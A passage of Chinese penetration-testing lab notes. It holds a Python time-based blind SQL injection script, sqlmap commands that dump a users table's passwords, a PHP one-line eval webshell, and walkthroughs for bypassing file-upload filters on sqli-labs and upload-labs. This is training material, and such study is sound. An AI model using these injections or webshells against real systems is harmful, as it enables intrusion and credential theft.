            res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-9/?id=1' and if(length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(3),1) -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取sql查询结果长度,程序退出."</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>
    <span class="token keyword">return</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">10</span> <span class="token operator">*</span> r<span class="token punctuation">)</span>
<span class="token comment"># python 入口函数</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    list_of_arguments <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv
    sql <span class="token operator">=</span> list_of_arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    length <span class="token operator">=</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>length<span class="token punctuation">&#125;</span></span><span class="token string"> , 开始获取内容"</span></span><span class="token punctuation">)</span>
    get_info<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> length<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"运行完毕, 请打开文件查看: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\\less9-data.txt"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="sqlmap自动化注入工具"><a href="#sqlmap自动化注入工具" class="headerlink" title="sqlmap自动化注入工具"></a>sqlmap自动化注入工具</h3><p>sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令</p>
<p><strong>基本参数使用</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">参数   					含义
<span class="token operator">-</span>h 							查看帮助手册
<span class="token operator">-</span>u 							指定 url 地址
<span class="token operator">-</span><span class="token operator">-</span>dbs 						列出所有数据库的名字
<span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>db 				列出当前数据库的名字
<span class="token operator">-</span>D 							指定一个数据库
<span class="token operator">-</span><span class="token operator">-</span>tables 					列出所有表名
<span class="token operator">-</span>T 							指定一个表
<span class="token operator">-</span><span class="token operator">-</span>columns 					列出所有字段名
<span class="token operator">-</span>C 							指定某些字段
<span class="token operator">-</span><span class="token operator">-</span>dump 						获取数据内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="sqlmap基本使用"><a href="#sqlmap基本使用" class="headerlink" title="sqlmap基本使用"></a>sqlmap基本使用</h4><h5 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1.检测注入点"></a>1.检测注入点</h5><p>检测是否存在sql注入漏洞，注意get型注入提交的url中要有含义参数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/58.PNG" alt="58"></p>
<p>如果结果中给出了注入点相关信息及payload，说明存在注入，可进一步挖掘数据</p>
<p><img src="/2023/012220963/59.PNG" alt="59"></p>
<h5 id="2-暴库"><a href="#2-暴库" class="headerlink" title="2.暴库"></a>2.暴库</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取当前库名</span>
python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/60.PNG" alt="60"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取</span>
python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>dbs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/61.PNG" alt="61"></p>
<h5 id="3-暴表"><a href="#3-暴表" class="headerlink" title="3.暴表"></a>3.暴表</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span><span class="token operator">-</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/62.PNG" alt="62"></p>
<h5 id="4-暴字段"><a href="#4-暴字段" class="headerlink" title="4.暴字段"></a>4.暴字段</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">-</span><span class="token operator">-</span>cloumns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/63.PNG" alt="63"></p>
<h5 id="5-暴数据"><a href="#5-暴数据" class="headerlink" title="5.暴数据"></a>5.暴数据</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取 security 库中 users 表中所有数据内容</span>
python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/64.PNG" alt="64"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取指定字段数据内容</span>
python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">-</span>C password<span class="token punctuation">,</span>username <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/65.PNG" alt="65"></p>
<h4 id="常见参数-1"><a href="#常见参数-1" class="headerlink" title="常见参数"></a>常见参数</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">参数 							含义
<span class="token operator">-</span>p 				标记注入点（指定注入参数）
<span class="token operator">-</span><span class="token operator">-</span>data 指定post参数 eg<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"userid=aaa&amp;passwd=bbbb"</span>
<span class="token operator">-</span>r  读取文件内容作为检测数据，进行注入检测 eg<span class="token punctuation">:</span> <span class="token operator">-</span>r less1<span class="token punctuation">.</span>txt
<span class="token operator">-</span><span class="token operator">-</span>level 设置测试的等级（<span class="token number">1</span><span class="token operator">-</span><span class="token number">5</span>，默认为<span class="token number">1</span>）lv2：cookie<span class="token punctuation">;</span> lv3：user<span class="token operator">-</span>agent，refere<span class="token punctuation">;</span> lv5：host
<span class="token operator">-</span><span class="token operator">-</span>risk 升高风险等级会增加数据被篡改的风险。risk <span class="token number">2</span>：基于事件的测试<span class="token punctuation">;</span>risk <span class="token number">3</span>：<span class="token keyword">or</span>语句的测试<span class="token punctuation">;</span>risk <span class="token number">4</span>
<span class="token operator">-</span><span class="token operator">-</span>random<span class="token operator">-</span>agent 随机ua进行测试
<span class="token operator">-</span><span class="token operator">-</span>cookie       指定cookie进行请求测试
<span class="token operator">-</span><span class="token operator">-</span>os<span class="token operator">-</span>shell     获取交互式shell
<span class="token operator">-</span><span class="token operator">-</span>dbms         指定数据库类型 eg<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token operator">-</span>dbms<span class="token operator">=</span>mysql
<span class="token operator">-</span><span class="token operator">-</span>os           指定目标操作系统 eg<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token operator">-</span>os<span class="token operator">=</span>windows
<span class="token operator">-</span><span class="token operator">-</span>threads      设置线程数 <span class="token number">1</span><span class="token operator">~</span><span class="token number">10</span> ，默认为<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>post注入</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># --data 指定参数 -p 标记注入点</span>
python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">11</span><span class="token operator">/</span> <span class="token operator">-</span><span class="token operator">-</span>
data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=123123&amp;submit=Submit"</span> <span class="token operator">-</span>p uname<span class="token punctuation">,</span>passwd
    
<span class="token comment"># -r 读取数据包检测 -p 标记注入点</span>
python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">11</span><span class="token operator">/</span> <span class="token operator">-</span>r less11<span class="token punctuation">.</span>txt <span class="token operator">-</span>p uname<span class="token punctuation">,</span>passwd

<span class="token comment"># --second-order 链接地址 //基于时间的注入</span>
python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>r 文件 <span class="token operator">-</span><span class="token operator">-</span>second<span class="token operator">-</span>order<span class="token operator">=</span><span class="token string">"链接地址"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>less11.txt(burp抓包)</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">11</span><span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">39</span>
Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> <span class="token builtin">max</span><span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>
Origin<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> 
like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">101.0</span><span class="token number">.4951</span><span class="token number">.67</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>
Accept<span class="token punctuation">:</span> 
text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>imag
e<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
Referer<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">11</span><span class="token operator">/</span>
Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
Cookie<span class="token punctuation">:</span> _dd_s<span class="token operator">=</span>logs<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token builtin">id</span><span class="token operator">=</span>43dd06af<span class="token operator">-</span><span class="token number">7456</span><span class="token operator">-</span>4c44<span class="token operator">-</span>899ba9e39defa9e4<span class="token operator">&amp;</span>created<span class="token operator">=</span><span class="token number">1652695481784</span><span class="token operator">&amp;</span>expire<span class="token operator">=</span><span class="token number">1652696582963</span>
Connection<span class="token punctuation">:</span> close
uname<span class="token operator">=</span>admin<span class="token operator">&amp;</span>passwd<span class="token operator">=</span><span class="token number">123123</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span>Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="SQLMAP参数大全"><a href="#SQLMAP参数大全" class="headerlink" title="SQLMAP参数大全"></a>SQLMAP参数大全</h3><p><a target="_blank" rel="noopener" href="https://app.yinxiang.com/fx/a2dd7f1f-f40a-4315-be93-7c4124073e67">https://app.yinxiang.com/fx/a2dd7f1f-f40a-4315-be93-7c4124073e67</a></p>
<h2 id="SQL注入漏洞4"><a href="#SQL注入漏洞4" class="headerlink" title="SQL注入漏洞4"></a>SQL注入漏洞4</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>post注入就是参数以post形式提交且提交的参数与数据库有交互</p>
<h4 id="sqli-less11-select注入"><a href="#sqli-less11-select注入" class="headerlink" title="sqli-less11 select注入"></a>sqli-less11 select注入</h4><h5 id="1-寻找注入点-1"><a href="#1-寻找注入点-1" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h5><h5 id="2-判断闭合符号-amp-amp-测试注入点"><a href="#2-判断闭合符号-amp-amp-测试注入点" class="headerlink" title="2.判断闭合符号&amp;&amp;测试注入点"></a>2.判断闭合符号&amp;&amp;测试注入点</h5><h5 id="3-注入SQL语句"><a href="#3-注入SQL语句" class="headerlink" title="3.注入SQL语句"></a>3.注入SQL语句</h5><h5 id="4-sqlmap注入"><a href="#4-sqlmap注入" class="headerlink" title="4.sqlmap注入"></a>4.sqlmap注入</h5><h4 id="sqli-less17-update注入"><a href="#sqli-less17-update注入" class="headerlink" title="sqli-less17 update注入"></a>sqli-less17 update注入</h4><h5 id="1-寻找注入点-2"><a href="#1-寻找注入点-2" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h5><h5 id="2-判断闭合符号-amp-amp-测试注入点-1"><a href="#2-判断闭合符号-amp-amp-测试注入点-1" class="headerlink" title="2.判断闭合符号&amp;&amp;测试注入点"></a>2.判断闭合符号&amp;&amp;测试注入点</h5><h5 id="3-注入SQL语句-1"><a href="#3-注入SQL语句-1" class="headerlink" title="3.注入SQL语句"></a>3.注入SQL语句</h5><h5 id="4-sqlmap注入-1"><a href="#4-sqlmap注入-1" class="headerlink" title="4.sqlmap注入"></a>4.sqlmap注入</h5><h5 id="5-update注入注意事项"><a href="#5-update注入注意事项" class="headerlink" title="5.update注入注意事项"></a>5.update注入注意事项</h5><h3 id="header头-referer-注入"><a href="#header头-referer-注入" class="headerlink" title="header头(referer)注入"></a>header头(referer)注入</h3><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h3 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h3><h2 id="一句话木马与文件上传漏洞"><a href="#一句话木马与文件上传漏洞" class="headerlink" title="一句话木马与文件上传漏洞"></a>一句话木马与文件上传漏洞</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>​        文件上传漏洞是指用户上传了一个可执行的脚本文件（php、jsp、xml、cer等文件），而 WEB 系统没有进行检测或逻辑做的不够安全。文件上传功能本身没有问题，问题在于上传后如何处理及解释文件。</p>
<p>​        文件上传攻击是指攻击者利用 Web 应用对上传文件过滤不严的漏洞，将应用程序定义类型范围之外的文件上传到 Web 服务器，并且此类文件通常为木马，在上传成功后，攻击者即可获得当前的webshell。</p>
<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>​        木马，全称特洛伊木马(Trojan Horse)是指寄宿在计算机里的一种非授权的远程控制程序。由于特洛伊木马程序能够在计算机管理员未发觉的情况下开放系统权限、泄漏用户信息、甚至窃取整个计算机管理使用权限，使得它成为了黑客们最为常用的工具之一。</p>
<p>​        一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用.</p>
<h3 id="一句话木马尝试"><a href="#一句话木马尝试" class="headerlink" title="一句话木马尝试"></a>一句话木马尝试</h3><ol>
<li><p>准备一个php文件shell.php，里面写入一下内容：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>将shell.php放入php网站的根目录</p>
</li>
<li><p>启动phpstudy</p>
</li>
<li><p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1/shell.php">phpinfo()</a>，结果显示php版本，代表一句话木马写入成功</p>
</li>
<li><p>使用post方式发送请求：1=system(‘whoami’)</p>
</li>
</ol>
<p>​    <img src="/2023/012220963/66.PNG" alt="66"></p>
<h3 id="文件上传靶场"><a href="#文件上传靶场" class="headerlink" title="文件上传靶场"></a>文件上传靶场</h3><p>upload-labs:<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">upload-labs</a></p>
<p>搭建方式：</p>
<ul>
<li><p>本地搭建</p>
<ul>
<li>phpstudy</li>
</ul>
</li>
<li><p>docker搭建</p>
<ul>
<li>~~~dockerfile<br>docker pull tanyiqu/upload-labs:21<br>docker run -d -p 8089:80 tanyiqu/upload-labs:21<pre class="line-numbers language-none"><code class="language-none">
ps:一些关卡只能通过Windows搭建实现，一些关卡只能通过Linux搭建实现，因此两种搭建方式都需要。

#### Docker

安装：[现成工具](https:&#x2F;&#x2F;meq.h5.xeknow.com&#x2F;s&#x2F;1QtIPk)

[kali中安装doceker](https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;MeeX9nmUWB9WcsuCUXZnuw)

docker管理工具

~~~dockerfile
docker pull portainer&#x2F;portainer

docker run -d -p 9000:9000 --name portainer --restart&#x3D;always  -v
&#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock -v portainer_data:&#x2F;data 
portainer&#x2F;portainer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
</ul>
<h3 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h3><p><a target="_blank" rel="noopener" href="https://www.sohu.com/a/461035838_99907709">https://www.sohu.com/a/461035838_99907709</a></p>
<p>Webshell管理工具非常多，目前主流且常用的有：</p>
<h4 id="蚁剑-AntSword"><a href="#蚁剑-AntSword" class="headerlink" title="蚁剑(AntSword)"></a>蚁剑(AntSword)</h4><p>Github:<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/">https://github.com/AntSwordProject/</a></p>
<h4 id="冰蝎-Behinder"><a href="#冰蝎-Behinder" class="headerlink" title="冰蝎(Behinder)"></a>冰蝎(Behinder)</h4><p>Github:<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
<h4 id="菜刀-Caidao"><a href="#菜刀-Caidao" class="headerlink" title="菜刀(Caidao)"></a>菜刀(Caidao)</h4><p>官网已经倒了，知道有这么个东西就行</p>
<h4 id="哥斯拉-Godzilla"><a href="#哥斯拉-Godzilla" class="headerlink" title="哥斯拉(Godzilla)"></a>哥斯拉(Godzilla)</h4><p>Github:<a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
<h3 id="文件上传前端绕过"><a href="#文件上传前端绕过" class="headerlink" title="文件上传前端绕过"></a>文件上传前端绕过</h3><p>环境：uplo-labs靶场 Windows&amp;Linux</p>
<p>关卡：Pass-01</p>
<p>此关卡中，网站只在客户端（浏览器）进行文件的验证。</p>
<ol>
<li>上传一个shell.php扩展名的文件，显示文件不允许上传，同时显示扩展名白名单</li>
</ol>
<p><img src="/2023/012220963/67.PNG" alt="67"></p>
<ol start="2">
<li>分析html中源码，在上传中发现存在一个JS验证</li>
</ol>
<p><img src="/2023/012220963/68.PNG" alt="68"></p>
<ol start="3">
<li>删除JS验证，重新上传shell.php，发现上传成功</li>
</ol>
<p><img src="/2023/012220963/69.PNG" alt="69"></p>
<p>在新的标签页打开上传的图片，显示php代码被解析，成功！！！</p>
<p><img src="/2023/012220963/70.PNG" alt="70"></p>
<h3 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h3><p>JSP环境：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">docker pull tanyiqu&#x2F;demo-upload:simple_jsp

docker run -d -p 8089:8080 tanyiqu&#x2F;demo-upload:simple_jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol>
<li>打开蚁剑，随便添加一条数据，选中，点击上方的生成shell,选择jsp格式生成（上方的shell生成小工具是插件，可以自行查找添加）</li>
</ol>
<p><img src="/2023/012220963/71.PNG" alt="71"></p>
<ol start="2">
<li>上传之后链接，显示白屏，成功</li>
</ol>
<p><img src="/2023/012220963/72.PNG" alt="72"></p>
<ol start="3">
<li>蚁剑连接成功</li>
</ol>
<p><img src="/2023/012220963/73.PNG" alt="73"></p>
<h2 id="文件上传黑名单绕过"><a href="#文件上传黑名单绕过" class="headerlink" title="文件上传黑名单绕过"></a>文件上传黑名单绕过</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>搭建好upload-labs靶场，无论是哪种绕过，首先代码审计，判断黑白名单</p>
<h3 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h3><p>黑名单：黑名单是一个列表，在黑名单列表里面记录的内容（人、手机号、ip等）或被限制或禁止执行一些操作。</p>
<p>白名单：白名单与黑名单相对，也是一个列表，只有在白名单列表里的内容（人、手机号、ip等）才可以执行一些操作，不在白名单记录的内容（人、手机号、ip等）则会被禁止执行操作。</p>
<p>文件上传漏洞黑名单：</p>
<p>某些网站禁止用户上传扩展名为 .asp .php .aspx .jsp 的文件， .asp .php .aspx .jsp 这个列表就叫做黑名单。</p>
<p>文件上传漏洞白名单：</p>
<p>某些网站只允许用户上传扩展名为 .png .jpg .gif 的文件， .png .jpg .gif 这个列表就叫做白名单。</p>
<h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>MIME：（Multipurpose Internet Mail Extensions），MIME是一种标准，用来表示文档、文件或字节流的性质和格式。</p>
<p>常见的MIME：</p>
<p><img src="/2023/012220963/74.PNG" alt="74"></p>
<p>服务器在检测上传的图片时，可能会检测文件的MIME类型。</p>
<p>此类检测可以通过修改MIME进行绕过</p>
<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 Windows&amp;Linux</p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-02</p>
<p>此关卡中，网站服务端检测 Content-Type （MIME）内容。</p>
<ol>
<li><p>开启代理和bp拦截</p>
</li>
<li><p>选择一个PHP文件上传</p>
</li>
<li><p>修改http包中的 Content-Type 为 image/png(如果害怕格式不对，可以先上传一个正确的格式复制，之后再去改上传php文件时的格式)</p>
</li>
</ol>
<ul>
<li>先上传白名单图片</li>
</ul>
<p><img src="/2023/012220963/75.PNG" alt="75"></p>
<ul>
<li>在上传不是白名单的图片，修改Content-Type</li>
</ul>
<p><img src="/2023/012220963/76.PNG" alt="76"></p>
<ol start="4">
<li>上传成功</li>
</ol>
<p><img src="/2023/012220963/77.PNG" alt="77"></p>
